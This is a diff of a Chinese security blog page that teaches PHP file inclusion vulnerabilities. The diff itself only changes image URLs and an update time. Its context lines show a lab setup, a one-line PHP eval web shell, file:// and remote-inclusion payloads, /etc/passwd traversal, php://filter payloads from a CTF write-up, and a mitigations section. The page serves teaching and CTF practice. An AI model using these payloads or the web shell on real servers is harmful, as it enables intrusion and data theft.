@@ -95,23 +95,23 @@
 <meta property="og:site_name" content="Leticia&#39;s Blog">
 <meta property="og:description" content="0x00 文件包含漏洞PHP文件包含漏洞，就是在通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来，就会导致文件信息的泄露甚至注入了恶意代码。 0x01 原理文件包含漏洞主要是程序员把一些公用的代码写在一个单独的文件中，然后使用其他文件进行包含调用，如果需要包含的文件使用硬编码，一般是不会出现安全问题，但是有时可能不确定需要包含哪些">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/file_include/include01.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/file_include/include02.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/file_include/include03.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/file_include/include04.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/file_include/include05.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/file_include/include06.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/file_include/include07.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/file_include/include08.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/file_include/include09.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/file_include/include10.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/file_include/include11.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/file_include/include12.png">
-<meta property="og:updated_time" content="2018-05-11T09:21:58.929Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include01.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include02.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include03.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include04.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include05.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include06.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include07.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include08.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include09.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include10.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include12.png">
+<meta property="og:updated_time" content="2018-10-26T03:36:49.054Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="文件包含漏洞">
 <meta name="twitter:description" content="0x00 文件包含漏洞PHP文件包含漏洞，就是在通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来，就会导致文件信息的泄露甚至注入了恶意代码。 0x01 原理文件包含漏洞主要是程序员把一些公用的代码写在一个单独的文件中，然后使用其他文件进行包含调用，如果需要包含的文件使用硬编码，一般是不会出现安全问题，但是有时可能不确定需要包含哪些">
-<meta name="twitter:image" content="http://oo3iot5oz.bkt.clouddn.com/file_include/include01.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include01.png">
 
 
 
@@ -408,23 +408,23 @@
 <p>123.txt:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;123&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>然后访问index.php，出现home。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_include/include01.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include01.png" alt=""></p>
 <p>访问index.php?p=123.txt,出现123，则环境搭建完成。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_include/include02.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include02.png" alt=""></p>
 <h2 id="0x03-本地文件包含"><a href="#0x03-本地文件包含" class="headerlink" title="0x03 本地文件包含"></a>0x03 本地文件包含</h2><p>我们先尝试本地文件包含漏洞，即获取的文件在搭载漏洞网站的服务器上，我们可以先尝试在桌面创建一个test.txt，写入如下内容。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;test&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>然后通过file协议访问index.php?p=file:///C:/Users/Leticia/Desktop/test.txt，发现显示test，说明可以apache服务器的权限很高，可以访问其他盘符位置，这样就可以遍历整个机器读取其中的敏感信息。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_include/include03.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include03.png" alt=""></p>
 <p>如果将test.txt中的内容换成一句话木马：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval ($_POST[&apos;leticia&apos;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>然后重新访问index.php?p=file:///C:/Users/Leticia/Desktop/test.txt，用菜刀连接一句话木马，发现可以获取整个计算机的读写权限。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_include/include04.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include04.png" alt=""></p>
 <h2 id="0x04-远程文件包含"><a href="#0x04-远程文件包含" class="headerlink" title="0x04 远程文件包含"></a>0x04 远程文件包含</h2><p>我们再尝试远程文件包含，上面已经说过，要使allow_url_fopen和 allow_url_include为0n，所以远程文件包含非常少见，我们为了测试漏洞，就先打开wamp安装路径下的php.ini文件，将这两条改为ON。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_include/include05.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include05.png" alt=""></p>
 <p>然后我们在虚拟机上新建一个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;ok&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
 <p>在虚拟机打开一个http server，然后访问index.php?p=<a href="http://192.168.31.203:8000/2.txt" target="_blank" rel="noopener">http://192.168.31.203:8000/2.txt</a></p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_include/include06.png" alt=""></p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_include/include07.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include06.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include07.png" alt=""></p>
 <p>如果把2.txt文件改成一句话木马，即可用菜刀连接。</p>
 <h2 id="0x05-利用方法"><a href="#0x05-利用方法" class="headerlink" title="0x05 利用方法"></a>0x05 利用方法</h2><p>文件包含漏洞有很多利用方式：</p>
 <h4 id="1、读取敏感文件"><a href="#1、读取敏感文件" class="headerlink" title="1、读取敏感文件"></a>1、读取敏感文件</h4><p>如../../../../../etc/passwd来读取敏感文件。</p>
@@ -435,17 +435,17 @@
 <h2 id="0x06-一个ctf例子"><a href="#0x06-一个ctf例子" class="headerlink" title="0x06 一个ctf例子"></a>0x06 一个ctf例子</h2><p>我们可以用一个ctf的例子来看看实际中怎么利用。</p>
 <p>是iscc的一道web题</p>
 <p>目标网址是一张图片 <a href="http://118.190.152.202:8006/" target="_blank" rel="noopener">http://118.190.152.202:8006/</a></p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_include/include08.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include08.png" alt=""></p>
 <p>源码中只有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;show.php?img=1.jpg&quot;&gt;</span><br></pre></td></tr></table></figure></p>
 <p>然后我们点开 <a href="http://118.190.152.202:8006/show.php?img=1.jpg" target="_blank" rel="noopener">http://118.190.152.202:8006/show.php?img=1.jpg</a></p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_include/include09.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include09.png" alt=""></p>
 <p>看到这个img参数，很容易想到文件包含漏洞</p>
 <p>然后访问 <a href="http://118.190.152.202:8006/show.php?img=file:///show.php" target="_blank" rel="noopener">http://118.190.152.202:8006/show.php?img=file:///show.php</a> 尝试访问本页面源码<br>发现file not find</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_include/include10.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include10.png" alt=""></p>
 <p>但是我们知道php://filter可以指定两个resource，这个时候构造<br><a href="http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=show.php" target="_blank" rel="noopener">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=show.php</a></p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_include/include11.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include11.png" alt=""></p>
 <p>然后查看源代码就可以看本页面代码了，接下来根据源码读取flag.php，查看源码，就完成了 <a href="http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=../flag.php" target="_blank" rel="noopener">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=../flag.php</a></p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_include/include12.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include12.png" alt=""></p>
 <h2 id="0x07-应对"><a href="#0x07-应对" class="headerlink" title="0x07 应对"></a>0x07 应对</h2><ul>
 <li><p>1.判断包含中的参数是否外部可控。</p>
 </li>
